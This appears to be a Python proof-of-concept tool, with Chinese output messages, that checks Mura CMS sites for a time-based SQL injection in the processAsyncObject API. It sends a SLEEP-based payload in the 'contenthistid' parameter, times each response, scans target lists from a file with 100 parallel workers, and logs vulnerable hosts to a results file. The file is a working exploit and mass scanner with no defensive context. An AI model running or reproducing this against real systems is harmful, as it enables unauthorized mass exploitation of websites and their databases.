import requests,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                                                               ______
                ______________________________________________ ___  /
                ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
                __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
                _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
                /_/                                                  
                                                   author:lly
                                                   date:2024-09-12
                                                   version:1.0                    
                """
    print(test)

def main():
    banner() 
    parser = argparse.ArgumentParser(description="Mura CMS processAsyncObject SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")


def poc(target):
    url_payload = '/index.cfm/_api/json/v1/default/?method=processAsyncObject'
    url = target+url_payload
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {"object": "displayregion", "contenthistid": "x\\' AND (SELECT 3504 FROM (SELECT(SLEEP(6)))MQYa)-- Arrv", "previewid": "1\r\n"}
    proxies = {
        'http':'http://127.0.0.1:7890',
        'https':'http://127.0.0.1:7890'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,proxies=proxies,verify=False)
        time = str(res.elapsed.total_seconds())[0]
        print(time)
        if res.status_code == 200:
            if '4' < time :
                print(f"[+] {target} 存在sql延时注入漏洞！")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print('漏洞不存在!!')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")
        

if __name__ == '__main__':
    main()